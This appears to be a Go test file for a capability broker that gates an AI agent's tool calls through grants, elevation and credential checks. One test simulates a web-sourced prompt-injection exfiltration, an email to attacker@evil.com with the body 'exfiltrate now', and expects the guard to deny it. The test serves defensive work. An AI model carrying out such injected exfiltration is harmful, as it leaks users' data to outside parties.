package broker

import (
	"testing"
	"time"

	"capability-broker/internal/capability"
	"capability-broker/internal/injection"
	"capability-broker/internal/policy"
)

func TestUnknownTaskAndMintOnly(t *testing.T) {
	s := newTestService(t)
	r, err := s.Call(CallReq{TaskID: "missing", Tool: "db", Operation: "read", Resource: "db://x"})
	if err != nil || r.Decision.Action != policy.Deny {
		t.Fatalf("%+v %v", r, err)
	}
	ct, _ := s.CreateTask(CreateTaskReq{
		Name: "m",
		Grants: []capability.Grant{{Tool: "db", Operation: "read", ResourcePattern: "db://customers/123/*"}},
	})
	c, err := s.MintOnly(ct.TaskID, "db", "read", "db://customers/123/profile")
	if err != nil || c == nil {
		t.Fatal(err)
	}
	if _, err := s.MintOnly(ct.TaskID, "email", "send", "email://a"); err == nil {
		t.Fatal("expected no grant")
	}
	p50, p99, n := s.LatencySnapshot()
	_ = p50
	_ = p99
	if n < 1 {
		t.Fatal("latency")
	}
}

func TestGuardFlagsExternalEmail(t *testing.T) {
	s := newTestService(t)
	ct, _ := s.CreateTask(CreateTaskReq{
		Name: "g",
		Grants: []capability.Grant{{
			Tool: "email", Operation: "send", ResourcePattern: "email://*",
			Constraints: capability.Constraints{DestinationAllowlist: []string{"*@evil.com", "*@ourco.com"}},
		}},
	})
	r, _ := s.Call(CallReq{
		TaskID: ct.TaskID, Tool: "email", Operation: "send",
		Resource: "email://attacker@evil.com",
		Arguments: map[string]string{"to": "attacker@evil.com", "body": "exfiltrate now"},
		Provenance: injection.Provenance{Source: injection.Web},
	})
	if r.Decision.Action != policy.Deny {
		t.Fatalf("guard/policy should deny: %+v", r.Decision)
	}
}

func TestDenyElevationPath(t *testing.T) {
	s := newTestService(t)
	ct, _ := s.CreateTask(CreateTaskReq{
		Name: "pay",
		Grants: []capability.Grant{{Tool: "payments", Operation: "charge", ResourcePattern: "payments://acct/1"}},
	})
	r1, _ := s.Call(CallReq{TaskID: ct.TaskID, Tool: "payments", Operation: "charge", Resource: "payments://acct/1", Arguments: map[string]string{"amount": "1"}})
	if _, err := s.DenyElevation(r1.ElevationID); err != nil {
		t.Fatal(err)
	}
	r2, _ := s.Call(CallReq{TaskID: ct.TaskID, Tool: "payments", Operation: "charge", Resource: "payments://acct/1", ElevationID: r1.ElevationID, Arguments: map[string]string{"amount": "1"}})
	if r2.Decision.Action != policy.Deny {
		t.Fatalf("%+v", r2.Decision)
	}
}

func TestPresentedCredentialHappy(t *testing.T) {
	s := newTestService(t)
	s.Controls.SingleUse = false
	s.Verifier.SkipNonce = true
	ct, _ := s.CreateTask(CreateTaskReq{
		Name: "p",
		Grants: []capability.Grant{{Tool: "db", Operation: "read", ResourcePattern: "db://customers/123/*"}},
	})
	r1, _ := s.Call(CallReq{TaskID: ct.TaskID, Tool: "db", Operation: "read", Resource: "db://customers/123/profile"})
	r2, _ := s.Call(CallReq{
		TaskID: ct.TaskID, Tool: "db", Operation: "read", Resource: "db://customers/123/profile",
		Credential: r1.Credential,
	})
	if r2.Decision.Action != policy.Allow {
		t.Fatalf("%+v", r2.Decision)
	}
	_ = time.Second
}
